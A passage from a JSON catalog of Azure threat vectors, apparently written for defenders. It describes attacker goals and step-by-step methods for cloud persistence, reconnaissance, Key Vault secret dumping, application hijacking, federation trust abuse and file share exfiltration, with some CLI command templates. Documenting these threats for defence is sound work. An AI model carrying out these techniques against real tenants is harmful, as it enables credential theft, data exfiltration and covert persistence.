Allow management of resources remotely from attacker-controlled tenants.\n- Facilitate lateral movement, data exfiltration, or further privilege escalation \nby leveraging cross-tenant capabilities and hidden delegated privileges.\n\nThe impact may include:\n\n- Full compromise of cloud assets and data.\n- Unnoticed attacker presence persisting through routine security hygiene (such as credential revocation).\n- Increased difficulty for defenders to detect or remove persistent access mechanisms.\n\n### Attack Flow and Methodology\n\nThe typical attack flow involves several steps:\n\n1. Privilege abuse: The attacker uses available tools (including Microsoft Graph \nAPI, PowerShell modules, or Azure Portal) to grant management rights or delegated \naccess to an external entity (such as Azure Lighthouse, Microsoft Partner delegation, \nor domain trust modification).\n2. Configuration: The attacker registers their external tenant, sets up delegated \naccess, or modifies domain trust/federation settings to establish a persistent link.\n3. Stealthy persistence: Even if initial access accounts/credentials are remediated, \nthe external entity retains management capabilities\u2014allowing the attacker to create \nnew accounts, manage resources, or harvest sensitive data.\n4. Maintenance: The attacker periodically refreshes delegated permissions, adds \nnew external users/entities, or modifies trust relationships as needed to maintain \naccess and evade detection.\n"
            },
            "d24fcc84-0e1e-41e1-8d0e-6ee9f8c6a068": {
                "name": "Azure - File Share Mounting",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "In the following threat vector, adversaries leverage Azure Storage Account File \nShares via NFS or SMB mounts to facilitate or escalate attacks.\n\n## Example Attack Scenario\n\nA typical scenario begins with an attacker stealing or hijacking privileged credentials, \nfor example through a \u201cPass the Cookie\u201d attack on a global administrator account. \nAfter obtaining administrative access, the adversary extends permissions to external \nusers and assigns them high-level roles within the Azure tenant. Leveraging this \nprivileged access, the adversary mounts Azure file shares to their own infrastructure, \nlaying the groundwork for:\n- Massive data exfiltration through direct access to sensitive storage.\n- Encrypting and holding file shares hostage for ransom (ransomware).\n- Stealthily manipulating or deleting critical business data, including Azure backup sets.\n\n## Attack Goals and Impact\n\nThe adversary\u2019s core objectives when mounting file shares are:\n- **Data Exfiltration:** Copying sensitive or proprietary data undetected from the \ncloud environment via NFS or SMB mount.\n- **Ransomware Operations:** Encrypting contents of file shares directly, disrupting \nbusiness continuity and demanding ransom payments for decryption.\n- **Persistence and Shadow IT:** Creating redundant access paths or mirroring content \nto maintain long-term presence within the victim's environment.\n- **Operational Disruption:** Deleting or corrupting critical files and backups \nto elevate operational risks and pressure response teams.\n\n## Attack Flow and Methodology\n\nThe typical methodology for File Share Mounting attacks involves these steps:\n- **Credential or Key Theft:** Adversaries obtain necessary Secrets, Shared Access \nSignatures (SAS), or access keys for a Storage Account, or elevate privileges to \nwrite and mount shares.\n- **Generate/Enumerate Connection Strings:** Using their access, attackers create \nconnection strings to Azure Storage File Shares, selecting NFS or SMB protocols \nas supported.\n- **Mount File Shares:** The adversary mounts the target file shares to attacker-controlled \nmachines or servers, treating Azure storage as a local/network drive.\n- **Execute Objectives:** With direct file system access:  - Download or exfiltrate data covertly.  - Upload and execute ransomware, encrypt data, or sabotage backups.  - Copy, modify, or delete content to facilitate further lateral movement or persistent threats.\n- **Evasion:** These actions often evade Azure default audit logging, as connections \nto the mounted file shares are typically not logged within Azure's native monitoring \ntools by default, reducing detection opportunities.\n\n## How the Adversary Generates the Connection String\nThe connection string typically contains the Storage Account name, File Share name,\nand authentication tokens or keys (e.g., SAS tokens or storage account keys).\n\nThe attacker must have access to these authentication credentials, which can be \nobtained through compromise or misconfiguration.\nWith these credentials, the attacker constructs a connection string formatted like:\n\nFor SMB:\n`\\\\<storage_account_name>.file.core.windows.net\\<file_share_name>`\nalong with the storage account key or SAS token used for authentication.\n\nFor NFS:\nA mount command such as\n`mount -t nfs <storage_account_name>.file.core.windows.net:/<file_share_name> <local_mount_point>`.\n\nOnce mounted, the adversary can read, write, delete, or exfiltrate files directly from the \nfile share as though it were a local drive.\n"
            },
            "fe6827f2-efb4-43b3-9ca3-b7d417111b32": {
                "name": "Azure - Gather Application Information",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This technique involves adversaries collecting data about applications running within Azure, \nespecially those registered in Azure Active Directory (Azure AD). The goal is to \ngain insight into application properties, configurations, exposed endpoints, permission \nscopes, and connections, in order to identify potential attack paths or vulnerabilities.\n\n### Example Attack Scenario\n\nAn adversary, during an initial reconnaissance campaign, uses publicly accessible \nAPIs and Azure Active Directory (AAD) enumeration techniques to gather information \nabout applications registered within the target's Azure tenant. By leveraging permissions \nsuch as `microsoft.directory/applications/*/read`, the attacker can identify applications, \nservice principals, their permissions, owners, secrets, and roles. For instance, \nan attacker using a compromised regular user account attempts to list all AAD applications \nand their configurations. They extract details on app registration, API permissions, \nand whether any apps have high privilege assignments, such as access to sensitive \ndata or elevated directory permissions. This information is used to map potential \ntargets for privilege escalation or lateral movement.\n\n### Attack Goals and Impact\n\n- **Goals:**  - Identify high-value applications and their associated service principals.  - Determine application permissions and trust relationships within AAD.  - Uncover misconfigurations, excessive privileges, or applications with weak security   controls.  - Establish a list of applications for further exploitation, such as app impersonation,   secret harvesting, or abuse of delegated permissions.\n\n- **Impact:**  - Facilitates subsequent privilege escalation or lateral attacks if vulnerable   apps/service principals are identified.  - May allow attackers to target apps for unauthorized access to sensitive information   or execution of high-impact operations.  - Lays the groundwork for consent phishing attacks or abuse of poorly secured   app registrations.  - Increases the risk of data exposure, unauthorized resource manipulation, and   tenant-wide compromises if attackers pivot successfully.\n\n### Attack Flow and Methodology\n\n1. **Data Gathering:**  - Executes read operations using permissions like `microsoft.directory/applications/*/read`   to pull application names, identifiers, associated owners, API permissions, and   role assignments.  - Enumerates app secrets/certificates and checks for possible excessive API scopes,   such as Application.ReadWrite.All or RoleManagement.ReadWrite.Directory.\n\n2. **Analysis of Privilege Assignments:**  - Evaluates permissions and assignments to locate applications with elevated   rights or direct access to critical resources.  - Identifies owners who may be targeted for account compromise or further social   engineering.\n\n3. **Planning Further Attacks:**  - Maps application interrelationships and privilege chains to design next-phase   attacks, such as credential theft, application takeover, or phishing consent requests.  - Assesses whether any applications are misconfigured, exposing endpoints or   secrets unintentionally.\n\n4. **Use of Discovered Data:**  - Uses harvested application data to target privilege escalation (e.g., adding   new credentials to an app as seen in advanced API permission abuse scenarios).  - May initiate attacks such as impersonation using app secrets or deploying malicious   applications with elevated permissions.\n"
            },
            "b1593e0b-1b3b-462d-9ab6-21d1c136469d": {
                "name": "Azure - Gather Resource Data",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The \u201cGather Resource Data\u201d technique is a key part of the reconnaissance phase in \nattacks against Azure environments. This activity focuses on enumerating information \nabout resources within a target Azure tenant or subscription to support subsequent \nattack phases.\n\n#### Example Attack Scenario\n\nA threat actor gains access to a compromised identity in an Azure environment, such \nas via phishing or a leaked credential. Using this access, the attacker enumerates \naccessible resources (e.g., virtual machines, storage accounts, databases, and identity \nconfigurations) by executing read operations like `{resource}/*/read`. For example, \nif the account has Reader or even limited permissions, the attacker can list resource \ngroups, virtual machines, Key Vaults, storage accounts, and see details such as \nconfigurations, names, and metadata. They might also list the names of secrets or \ncertificates in a Key Vault\u2014while unable to access the contents without elevated \npermissions, this reconnaissance helps prioritize attack targets.\n\n#### Attack Goals and Impact\n\n- **Goals:**  - Develop a comprehensive map of the organization\u2019s Azure environment.  - Identify high-value resources (e.g., storage accounts with sensitive data, Key   Vaults, privileged identities).  - Find weakly configured, over-permitted, or exposed resources (public endpoints,   misconfigured access policies).  - Inform next stages of the attack (privilege escalation, lateral movement, data theft).\n\n- **Potential Impact:**  - **Accelerated compromise:** With detailed resource and configuration information,   attackers can quickly focus on the most lucrative or vulnerable targets.  - **Increased stealth:** Attackers can tailor subsequent steps to avoid detection\u2014targeting   overlooked or poorly monitored resources.  - **Data exposure:** Identification of exposed storage or secrets can result in   immediate or subsequent sensitive data breaches.\n\n#### Attack Flow and Methodology\n\n1. **Automated Enumeration:** Utilizing Azure CLI, PowerShell (e.g., `Get-AzResource`, `az resource list`), \nREST APIs, or scripts, the attacker lists:  - Resource groups and their contents  - Virtual machines, storage accounts, databases, and Key Vaults  - Permissions and access policies associated with resources\n2. **Asset Profiling:** The attacker collects details on configurations, public IPs, \nRBAC permissions, and metadata for each resource.\n3. **Vulnerability Identification:** Analysis focuses on resources where permissions, \nnetwork exposure, or configurations suggest potential for privilege escalation or data access.\n4. **Preparation for Next Stages:** The attacker plans lateral movement, privilege \nescalation, or direct attacks on data, using the knowledge obtained to target weak points.\n"
            },
            "140907eb-c9fb-4330-9d71-656422388b2b": {
                "name": "Azure - Gather Role Information",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The \"Gather Role Information\" refers to an adversary's effort to enumerate and obtain \ndetails about roles, role assignments, and the privileges associated with specific \naccounts or applications within Azure Active Directory (AAD) and Azure Resource \nManager environments. This reconnaissance phase is foundational, setting up future \nattacks by mapping out who can do what within the Azure estate.\n\n#### Example Attack Scenario\n\nAn attacker gains access to a compromised low-privilege user account in an Azure tenant. \nLeveraging their access, the adversary initiates API and portal queries to enumerate \nall directory roles, their descriptions, nested role assignments, and identify which \nusers or service principals hold elevated privileges (like Global Administrator, \nApplication Admin, or Contributor). \n\nFor example, the attacker uses available Microsoft Graph API permissions like `microsoft.directory/roleAssignments/standard/read` \nor `microsoft.directory/directoryRoles/members/read` to extract:\n- A listing of all roles within the tenant.\n- The users/groups assigned to these roles.\n- The service principals and applications with privileged roles.\n\nWith this intelligence, the attacker pinpoints accounts with standing access to \nsensitive resources, cloud infrastructure, or the ability to modify security controls. \nThis information enables them to focus follow-on attacks (such as phishing, lateral movement, \nprivilege escalation, or controlling cloud resources) on the most impactful targets.\n\n#### Attack Goals and Impact\n\n**Attack Goals:**\n- **Enumerate privileged accounts:** Learn which identities have administrator or \nother elevated roles.\n- **Understand role-based access controls:** Discover which roles are assigned to \ncloud workloads, services, and third-party integrations.\n- **Map the privilege model:** Identify paths to escalate privileges or move laterally \nwithin the tenant.\n- **Target specific high-value accounts:** Single out accounts or service principals \nmost beneficial for further attack phases.\n\n**Impact:**\n- **Precision in follow-on attacks:** Enables highly targeted privilege escalation, \npersistence, or data exfiltration.\n- **Facilitates credential theft or misuse:** Attackers concentrate phishing, token theft, \nor abuse on users who can cause maximum damage.\n- **Exposure of sensitive information:** Mapping out service principals, applications, \nand their privileges may reveal misconfigurations or vulnerabilities exploitable \nfor direct access to business-critical resources.\n- **Reduces attacker effort:** By understanding the privilege hierarchy, attackers \navoid unnecessary noise and maximize their effectiveness.\n\n#### Attack Flow and Methodology\n\n1. **Access Acquisition:**  - Attacker obtains valid credentials or API access (even with limited privileges) within the Azure tenant.\n\n2. **Role Enumeration:**  - Uses Microsoft Graph, AzureAD, or Azure Resource Management APIs/portals to   list all directory roles (`directoryRoles/standard/read`), their descriptions,   and their associated members.  - Specifically requests assignments (`roleAssignments/standard/read`) and membership   lists to correlate identities with roles.\n\n3. **Correlation and Mapping:**  - Maps users, groups, applications, and service principals to their assigned roles.  - Correlates admin accounts, app owners, and standing access roles across different   Azure resources or subscriptions.\n\n4. **Analysis:**  - Analyzes output to spot high-privilege accounts (e.g., Global Admin, Owner, Contributor),   and applications with dangerous permissions.  - May additionally search for legacy, orphaned, or misconfigured roles to exploit   gaps in security controls.\n\n5. **Preparation for Exploitation:**  - Prepares to exploit the gathered intelligence, such as launching spear-phishing   campaigns specifically targeting privileged users, leveraging known vulnerabilities   in third-party applications, or planning lateral movement towards sensitive workloads.\n"
            },
            "2900d389-3098-49d3-8166-5b2612d03576": {
                "name": "Azure - Gather User Information",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This technique describes how adversaries obtain information about user accounts \nin Azure Active Directory (AAD), which can be leveraged for further attack planning \nand targeting within a cloud environment.\n\n### Example Attack Scenario\n\nAn attacker with limited or no access to an Azure environment targets an organization \nusing Azure Active Directory. After they obtain information, attackers then cross-references \nthis information with social media profiles and other public data, building a list \nof high-value users and their roles. Armed with these details, the attacker crafts \ntargeted phishing campaigns or searches for weak credentials and misconfigurations \nwith those accounts. For example, the attacker might use an Azure API such as `Get-AzureADUser` \nto enumerate users if they have a valid credential, or scrape corporate websites \nfor employee contact details, inferring Azure AD presence.\n\n### Attack Goals and Impact\n\n- **Primary Goal:** To obtain as much information about users as possible\u2014especially \nprivileged or high-value accounts\u2014without alerting defenders.\n- **Impact:**  - Enables targeted social engineering, phishing attacks, and credential stuffing.  - Helps attackers identify privilege relationships, which aids in lateral movement   planning and privilege escalation.  - Reveals organizational structure, making subsequent attacks more precise and effective.  - May lead to sensitive data exposure (including personal information if the account   is later compromised).\n\n### Attack Flow and Methodology\n\n1. **Discovery & Enumeration:**  - Attacker passively searches public sources (corporate sites, LinkedIn) for names,   roles, group memberships.  - If attacker obtains a valid account/credential (through phishing or prior compromise),   they may use Azure AD enumeration APIs (`Get-AzureADUser`, etc.) to list all   users, roles, and privileges.\n\n2. **Data Aggregation:**  - Combine enumerated internal data (user lists, group memberships) with external   information (social media, breached databases).  - Map relationships and find which users have critical access, such as global   administrators, application owners, or service principal managers.\n\n3. **Analysis & Targeting:**  - Identify users who are most likely susceptible to social engineering (frequently contacted staff, IT helpdesk).  - Prioritize accounts for further compromise attempts based on access level.\n\n4. **Preparation for Further Attack Phases:**  - Use gathered user information to launch credential stuffing, spear phishing,   consent phishing, or authentication token theft attacks.  - Attempt further reconnaissance focused on those high-value targets, such as   checking group assignment, roles, and recent activity.\n"
            },
            "4e7eae8e-6615-41f2-bfe1-21a04f7a6088": {
                "name": "Azure - Gather Victim Data",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The \"Gather Victim Data\" is a reconnaissance threat vector within the \nAzure Threat Research Matrix (ATRM). It involves an adversary accessing a user's \npersonal data after compromising their account. This data may include sensitive \ninformation stored in Microsoft cloud services such as email, OneDrive, Teams, and \nother personal content linked to the user's Azure Active Directory account.\n\n#### Example Attack Scenario  \n\n- An attacker creates a malicious Azure application that requests access permissions \nto victim data like emails, OneDrive files, or Teams messages. \n- The attacker then sends a phishing email to a target user within an organization, \ntricking them to grant consent to this malicious app.\n- Once the user grants access, the app obtains delegated permissions to access the \nvictim's data across Microsoft 365 services.\n- The attacker uses the obtained tokens or permissions to programmatically extract \nemails, files, conversations, and other personal or organizational data.\n- The attacker may use this data for further phishing, reconnaissance, or lateral \nmovement attacks within the Azure tenant.\n\n#### Attack Goals and Impact  \n\n- **Goals**: Steal sensitive business or personal information, emails, files, and \ncommunications to gain insights into victims, plan secondary attacks, or conduct espionage.\n- Gain privileged information for later stages of attacks (e.g., lateral movement, \ncredential theft, privilege escalation).\n- Use stolen data for spear phishing campaigns or to impersonate trusted users internally \nor externally.\n- Maintain persistence by harvesting tokens and credentials for prolonged access.\n- Impact includes data breaches, intellectual property theft, regulatory compliance \nviolations, reputational damage, and financial loss.\n\n#### Attack Flow and Methodology\n\n1. **Token Theft**: Using OAuth tokens or API calls, attacker programmatically accesses \nvictim data such as emails, OneDrive files, Teams conversations.\n2. **Data Collection and Exfiltration**: Captured data is collected, filtered, and \nexfiltrated for further use. This can be automated via scripts or tools like 365-Stealer.\n3. **Lateral Movement / Escalation**: Using gathered intelligence, the attacker \nidentifies high-value targets, escalates privileges, or moves laterally across the enterprise.\n4. **Persistence and Cover-Up**: The adversary maintains presence, possibly by registering \nadditional apps or accounts and attempts to remain undetected by throttling activity \nor delaying requests.\n"
            },
            "78d5e363-14db-40c0-a1c4-4ba02a3e60d4": {
                "name": "Azure - Hijack Entra ID Applications",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "Hijacking an application (by adding a rogue secret or certificate) with granted permissions \nwill allow the attacker to access data that is normally protected by MFA requirements.\nModification of an application via the browser - The attacker connected to the \nAzure Portal with a web browser and added a new secret to an App Registration that\nhad permissions to read all mail. There is no supported way to add a credential \nto an Enterprise Application (service principal) via the browser.\nModification of an application via PowerShell - The attacker connected to the Microsoft \n365 tenant using Azure AD PowerShell. Once connected they added certificates to App \nRegistrations and Enterprise Applications that had the mail.read and files.read permission."
            },
            "bcf3bb96-ed97-4853-98ab-937c2d214f4e": {
                "name": "Azure - Key Vault persistence",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Key Vault persistence refers to techniques attackers use to maintain ongoing, unauthorized \naccess to Azure Key Vault and its contents\u2014such as secrets, keys, and certificates\u2014after \ninitial compromise or detection. This persistence is typically achieved by modifying \nKey Vault access policies to grant permissions to additional malicious accounts \nor identities.\n\n## How persistence is achieved\n\n- **Access policy modification:**    - Attackers with sufficient permissions (such as `Microsoft.KeyVault/vaults/write`   or `Microsoft.KeyVault/vaults/accessPolicies/write`) can add their own user account   or a service principal to the Key Vault's access policy.  - This allows the attacker to maintain access even if their original account is   disabled or monitored.\n- **Privilege escalation:**    - Misconfigured roles, such as the \"Key Vault Contributor\" role, can be exploited   to grant data access rights, despite the role's intended purpose being limited   to management of the Key Vault resource itself.  - This is possible because the role includes permissions to modify access policies,   enabling self-granting of data plane access.\n\n## Attack scenarios\n\n- **Initial access:**    - An attacker gains access to an account with Key Vault management permissions,   often via phishing or credential theft.\n- **Privilege Escalation:**    - The attacker uses their permissions to modify Key Vault access policies, granting   themselves (or a controlled account) permissions to read, list, or decrypt secrets,   keys, and certificates.\n- **Persistence:**    - The attacker adds additional malicious accounts or service principals to the   access policy, ensuring continued access even if their original account is blocked.\n- **Data exfiltration and abuse:**    - With persistent access, the attacker can periodically extract secrets, keys,   or certificates, and use these to compromise other cloud workloads, disrupt operations,   or abuse services.\n\n## Real-world risks\n\n- **Data exposure:**    - Unauthorized access to secrets (e.g., API keys, connection strings, tokens)   can lead to broader system compromise.\n- **Compromised credentials:**    - Stolen secrets can be used to access other Azure resources or external systems.\n- **Stealthy Persistence:**    - Attackers can maintain long-term access, making detection and recovery difficult.\n- **Service disruption and abuse:**    - Attackers may alter configurations, disrupt services, or deploy unauthorized   resources using stolen credentials.\n"
            },
            "81338b90-f80c-40cc-8a57-ba97cdf86948": {
                "name": "Azure - Key Vault reconnaissance",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure Key Vault reconnaissance refers to the techniques and activities adversaries \nuse to discover, enumerate, and gather information about Azure Key Vault resources \nwithin a target environment. The goal is to identify valuable secrets, misconfigurations, \nand potential attack paths, often as a precursor to privilege escalation, lateral movement, \nor data exfiltration.\n\n## Why Azure Key Vaults Are Targeted\n\n- **High Value**: Key Vaults store cryptographic keys, secrets (like API keys and passwords), \nand certificates, making them attractive to attackers.\n- **Widespread Usage**: They are commonly used by organizations to manage sensitive \ninformation for applications and services.\n\n## Common Reconnaissance Techniques\n\n### Enumeration of Key Vaults\n\nAttackers with the `Microsoft.KeyVault/vaults/read` permission can list all Key \nVaults in a subscription, revealing vault names and resource groups. This helps \nidentify which vaults to target based on naming conventions or access policies.\n\n- **Azure CLI Example**:    `az keyvault list --query \"[].{Name:name, ResourceGroup:resourceGroup}\" -o table`\n\n### Listing Keys, Secrets, and Certificates\n\nOnce a vault is identified, attackers may attempt to enumerate keys, secrets, and \ncertificates within it, provided they have appropriate permissions. This can expose \nmetadata that hints at the vault\u2019s contents and potential value.\n\n- **Azure CLI Example**:    `az keyvault secret list --vault-name  --query \"[].{Name:name, Enabled:attributes.enabled}\" -o table`\n\n### Access Policy and RBAC Reconnaissance\n\nAttackers may enumerate access policies and RBAC assignments to identify users, \nservice principals, or managed identities with privileged access. Misconfigurations \nor excessive permissions can be exploited for further attacks.\n\n- **Azure CLI Example**:    `az keyvault show --name  --query \"properties.accessPolicies[].{ObjectId:objectId, Permissions:permissions}\"`\n\n### Control Plane vs. Data Plane Enumeration\n\nReconnaissance can occur via both the management/control plane (e.g., Azure Resource Manager API) \nand the data plane (direct Key Vault API). Weak separation or insufficient RBAC \nenforcement between these planes can increase risk.\n\n### Exploiting Network and Access Misconfigurations\n\nAttackers may probe for Key Vaults with public network access enabled or weak firewall \nrules, increasing the likelihood of successful enumeration and subsequent attacks.\n"
            },
            "09aec351-7dfb-4cde-8570-d3c7a36e1241": {
                "name": "Azure - KeyVault Dumping",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "In this threat vector an attacker extracts secrets, certificates, or keys from an \nAzure Key Vault to facilitate further attacks or lateral movement within the environment.\n\n### Example Attack Scenario\n\nAfter compromising an Azure AD account, this account has roles like Key Vault Contributor \non a resource group but lacks direct Key Vault data read access through RBAC. However, \nthe vault is configured with traditional access policies instead of RBAC, allowing \nthe attacker to add their own user or service principal to the policy with all permissions. \nAfter updating the policy, the attacker can now dump all secrets, keys, and certificates \nstored in Key Vault, including API keys, credentials, and cryptographic material \nfor critical applications.\n\n### Attack Goals and Impact\n\nThe primary goal is to gain **unauthorized access** to highly sensitive material \nsuch as application secrets, encryption keys, database credentials, or signing certificates. \nThis can lead to:\n- Complete compromise of applications relying on Key Vault for secure secret storage\n- Lateral movement by using dumped secrets to authenticate to other Azure resources\n- Escalation of privileges by harvesting secrets that give broader access within the Azure environment\n- Undetected persistence if logging is disabled or improperly configured on the Key Vault.\n\nBusiness impact can include significant data breaches, loss of integrity for business \nprocesses, and regulatory repercussions due to exposure of protected credentials.\n\n### Attack Flow and Methodology\n\n- The attacker compromises a privileged Azure account or service principal.\n- They enumerate assigned roles and discover Key Vault Contributor permission on a resource group.\n- If the targeted Key Vault uses access policies instead of RBAC, the contributor \ncan add themselves to the vault\u2019s access policy with full access rights.\n- With the new policy, the attacker calls Key Vault data plane APIs to list and \nretrieve all stored keys, certificates, and secrets. For example:  - `Microsoft.KeyVault/vaults/secrets/getSecret/action`  - `Microsoft.KeyVault/vaults/certificates/read`  - `Microsoft.KeyVault/vaults/keys/read`\n- Extracted credentials are used to access protected resources elsewhere, potentially \nchaining this access for lateral movement.\n- If Key Vault logging is not enabled, this activity may go undetected unless anomalous \npattern detection (such as sudden bulk secret access or policy changes) triggers alerts.\n"
            },
            "2fd1cddb-c66d-4a99-9779-31e32b67495e": {
                "name": "Azure - Lateral movement abusing Cross-Tenant Synchronization",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "When configuring CTS, an Azure source tenant will be synchronized with a target tenant, \nwhere users from the source can automatically be synchronized to the target tenant. \nWhen synchronizing users, the user is only pushed from the source and not pulled \nfrom the target, making this a one-sided synchronization.\n\nHowever, if improperly configured, attackers who have already compromised a tenant and gained\nelevated privileges may exploit this feature, to move laterally to other connected tenants.\n\nAttackers must look for tenants with 'Outbound Sync' enabled, which allows syncing\nto other tenants. Next step is to locate the app used for CTS syncing and modify\nits configuration to add the compromised user into its sync scope,\ngaining access to the other tenant's network.\n\nThis allows the threat actor to achieve lateral movement without requiring new user credentials.\n"
            },
            "85c8e0dd-b012-402d-bb09-5d354c16ebb9": {
                "name": "Azure - Local Resource Hijack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves attackers tampering with local files or resources\u2014such \nas profile scripts or pipeline artifacts\u2014to escalate privileges and gain unauthorized \naccess to cloud resources.\n\n## Example Attack Scenario\n\nAn adversary, with write access to a storage account linked to Azure Machine Learning \n(AML) or Azure CloudShell, modifies a startup or invoker script (e.g., `.bashrc` \nor pipeline component scripts) stored in blob storage. For AML, the attacker replaces \na component invoker script with malicious code that executes during the next scheduled \npipeline job. The code then exploits the AML compute\u2019s managed identity\u2014potentially \ninheriting elevated permissions from the pipeline owner\u2014to extract secrets from \nAzure Key Vault, reassign roles, or access broader Azure resources. In CloudShell, \nthe `.bashrc` file inside the `.IMG` profile is altered to run commands that covertly \nadd an attacker account to privileged roles across the subscription.\n\n## Attack Goals and Impact\n\n- **Privilege escalation**: The attacker aims to execute code or commands under \na more privileged identity, going from low user/storage access to Contributor, Owner, \nor admin roles in Azure. This may involve extracting secrets from Key Vaults, accessing \nsensitive data, or reassigning role memberships.\n- **Persistence and lateral movement**: By hijacking profile/startup scripts or \npipeline artifacts, the attacker ensures continued access, potentially moving laterally \nto other cloud services or even on-premises networks\u2014all without triggering immediate alarms.\n- **Resource abuse**: Attackers may run unauthorized workloads, such as cryptominers, \nor deploy malware, impacting resource costs and security posture.\n\n## Attack Flow and Methodology\n\n1. **Script modification**:  - AML case: The attacker modifies or uploads a malicious invoker script to the   pipeline component directory in the Storage Account. If necessary, the YAML config   is altered to ensure execution of the script.  - CloudShell case: The attacker alters the `.bashrc` (or PowerShell profile)   file inside the profile `.IMG` so that, on shell launch, privileged escalation   or backdoor commands are executed.\n2. **Execution and privilege escalation**:  - On the next job/pipeline run (AML) or CloudShell launch, the modified script   executes with the context of the managed/system identity\u2014often inheriting the   permissions of the pipeline owner or compute administrator.  - Malicious code retrieves secrets, changes role assignments, or accesses broader   Azure resources; for CloudShell, commands may add attacker accounts to privileged   Azure roles automatically.\n3. **Persistence and impact**:  - The attacker may persist access by continuously modifying invocation scripts   or startup files, or by creating new high-privilege accounts/role assignments.  - Broader impact includes data exfiltration, resource hijacking, or stealthy   malware deployment.\n"
            },
            "4d9cc646-debc-477b-93cb-4ea74c47c02c": {
                "name": "Azure - Managed Device Scripting",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves adversaries abusing device management capabilities \nto execute code on devices through services like Intune and Entra ID (AzureAD).\n\n## Example Attack Scenario\n\nAn attacker who gains administrative access to AzureAD or Intune can deploy PowerShell \nor Python scripts to managed devices. For example, a compromised AzureAD account \nwith device management rights could push a malicious PowerShell script to employee \nlaptops using Intune, which then installs ransomware or exfiltrates sensitive data \nwithout user interaction.\n\n## Attack Goals and Impact\n\nThe primary goal is to achieve **remote code execution** across a fleet of managed \ndevices. Attackers may aim to:\n- Steal credentials or sensitive files\n- Install persistence mechanisms for future access\n- Deploy ransomware, spyware, or other malware\nThis can lead to widespread compromise, significant data breaches, and business \ndisruption, particularly because device scripting can touch many endpoints simultaneously.\n\n## Attack Flow and Methodology\n\n1. Use administrative capabilities (such as `microsoft.directory/devices/basic/update`) \nto push scripts to selected managed devices.\n2. The scripts execute with system-level privileges if the targeting configuration \nis misused, allowing the attacker to harvest data, pivot to other internal resources, \nor further entrench their presence.\n3. Attackers may cover tracks by modifying or deleting audit logs accessible through IntuneAuditLogs.\n"
            },
            "9bb31c65-8abd-48fc-afe3-8aca76109737": {
                "name": "Azure - Modify federation trust to accept externally signed tokens",
                "model": true,
                "tlp": "clear",
                "criticality": "Emergency",
                "description": "Once they acquired sufficient priviledges,attackers add their own certificate as \na trusted entity in the domain either by adding a new federation trust to \nan existing tenant or modifying the properties of an existing federation \ntrust. As a result, any SAML token they create and sign will be valid for \nthe identity of their choosing. This attack may be performed as an alternative\nto the Golden SAML attack to gain persistent access without having to sign \nthe SAML response at each access request, while needing the same amount of control \nover the ADFS server."
            },
            "37f24c48-4a38-4682-aa76-5845ed2d6890": {
                "name": "Azure - Policy with DeployIfNotExists definition",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector, let attackers maintain long-term access or\nfacilitate further exploitation. \n\n### Example Attack Scenario\n\nAn attacker with sufficient permissions in an Azure tenant creates or modifies \nan Azure Policy using the `DeployIfNotExists` policy definition. This policy is\nengineered to deploy a malicious resource (e.g., a virtual machine extension,\na role assignment, or a script backdoor) whenever certain conditions are met, \nsuch as new VMs being provisioned. The attacker also triggers remediation so\nthe malicious payload is retroactively deployed to existing resources in scope.  \n\nFor example, the attacker could use Azure Policy to automatically grant their\naccount or service principal administrative permissions on every new or existing\nVM, or silently disable logging and monitoring across sensitive assets to evade\ndetection.\n\n### Attack Goals and Impact\n\nThe objective is to enable persistent access or privilege escalation by leveraging \nAzure's orchestration and policy automation features. Typical goals include:\n- Establishing backdoors in affected resources (VMs, service principals, databases) \nfor repeated covert access.\n- Modifying logging, auditing, or security configurations to avoid detection (for \ninstance, disabling Azure Activity Logs for specific assets).\n- Automatically re-applying attacker-controlled changes whenever the legitimate \nadministrator attempts remediation or, through continuous policy enforcement, on \nevery new resource.\n- Assigning additional permissions, modifying access control lists, or deploying \nmalware through policy-triggered tasks.\nThe impact is broad, enabling attackers to maintain long-term access with minimal \noperational footprint, bypass typical monitoring controls, manipulate resources \nat scale, and orchestrate further attack stages (such as lateral movement or\nprivilege escalation).\n\n### Attack Flow and Methodology\n\nThe typical attacker workflow follows these steps:\n\n- **Policy Creation/Modification**: A new policy is created, or an existing one \nis modified, with a \"DeployIfNotExists\" or similarly reactive definition. The definition \nspecifies a payload\u2014such as deploying a VM extension, custom script, role assignment, \nor other resource manipulation\u2014that achieves the persistence goal.\n- **Scope Assignment**: The attacker assigns the malicious policy to targeted scopes \n(resource groups, subscriptions, or management groups) to maximize coverage and effect.\n- **Remediation Triggering**: Remediation is kicked off so policy enforcement is \napplied to existing resources\u2014retrospectively deploying the backdoor.\n- **Continuous Enforcement**: As policy is automatically enforced, every future \nresource creation or update within scope will bear the attacker's payload\u2014ensuring \npersistence and stealth.\n- **Evading Detection**: The attacker may also configure policies to weaken monitoring, \ndisable security logging, or only target specific assets to avoid suspicion and discovery.\n"
            },
            "394dde97-4a8c-4b6a-8f8b-c6bf18a7a87f": {
                "name": "Azure - Port Mapping",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
